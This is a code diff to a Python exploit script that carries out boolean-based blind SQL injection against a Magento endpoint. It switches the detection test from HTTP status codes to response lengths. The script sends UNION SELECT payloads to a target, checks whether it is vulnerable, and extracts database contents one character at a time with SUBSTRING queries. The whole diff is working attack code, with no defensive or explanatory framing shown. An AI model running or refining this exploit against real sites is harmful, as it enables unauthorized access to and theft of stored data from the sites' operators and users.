@@ -30,7 +30,7 @@ def check_target(target):
 
 
 def test_sqli(target, condition):
-    """Test a boolean SQL injection condition. Returns True if condition is TRUE."""
+    """Test a boolean SQL injection condition. Returns response length."""
     url = (
         f"{target}/catalog/product_frontend_action/synchronize"
         f"?type_id=recently_products"
@@ -40,39 +40,53 @@ def test_sqli(target, condition):
     )
     try:
         r = requests.get(url, timeout=10, verify=False)
-        return r.status_code
-    except Exception:
-        return None
+        return len(r.text), r.status_code
+    except Exception as e:
+        print(f"[!] Error during request: {e}")
+        return None, None
 
 
 def check_vulnerability(target):
     """Verify the SQLi vulnerability exists using boolean blind technique."""
     print("\n[*] Checking for SQL injection vulnerability...")
+    print("[*] This may take a moment...")
 
-    status_true = test_sqli(target, "SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1")
-    status_false = test_sqli(target, "SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0")
+    len_true, status_true = test_sqli(target, "SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1")
+    len_false, status_false = test_sqli(target, "SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0")
 
-    if status_true is not None and status_false is not None:
-        if status_true != status_false:
-            print("[+] VULNERABLE! Different responses detected:")
+    if len_true is not None and len_false is not None:
+        print(f"[*] TRUE condition:  HTTP {status_true}, Response length: {len_true}")
+        print(f"[*] FALSE condition: HTTP {status_false}, Response length: {len_false}")
+        
+        # Check for differences in response length
+        if len_true != len_false:
+            print(f"[+] VULNERABLE! Different response lengths detected:")
+            print(f"    TRUE condition:  {len_true} bytes")
+            print(f"    FALSE condition: {len_false} bytes")
+            return True, len_true
+        # Fallback: check status codes
+        elif status_true != status_false:
+            print(f"[+] VULNERABLE! Different HTTP status codes detected:")
             print(f"    TRUE condition:  HTTP {status_true}")
             print(f"    FALSE condition: HTTP {status_false}")
             return True, status_true
         else:
-            print(f"[-] Same response for both conditions: HTTP {status_true}")
-            print("[-] Target may not be vulnerable or not properly set up.")
+            print(f"[-] Same response for both conditions (length={len_true}, status={status_true})")
+            print("[-] Target may not be vulnerable, not properly set up, or database not connected.")
+            print("[*] Tip: Make sure Magento is fully initialized and database is connected.")
             return False, None
     else:
         print("[-] Could not get response from target.")
         return False, None
 
 
-def extract_data(target, query, true_status, max_length=64):
+def extract_data(target, query, true_marker, max_length=64):
     """Extract data using boolean-based blind SQL injection."""
     result = ""
-    charset = string.ascii_letters + string.digits + string.punctuation
+    charset = string.ascii_letters + string.digits + string.punctuation + " _-.@:"
 
     print(f"[*] Extracting data with query: {query}")
+    print(f"[*] Using marker: {true_marker}")
 
     for pos in range(1, max_length + 1):
         found = False
@@ -81,8 +95,10 @@ def extract_data(target, query, true_status, max_length=64):
                 f"SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+"
                 f"SUBSTRING(({query}),{pos},1)='{char}'"
             )
-            status = test_sqli(target, condition)
-            if status == true_status:
+            length, status = test_sqli(target, condition)
+            
+            # Check if this character matches (compare with true_marker)
+            if isinstance(true_marker, int) and length == true_marker:
                 result += char
                 sys.stdout.write(f"\r[+] Extracted: {result}")
                 sys.stdout.flush()
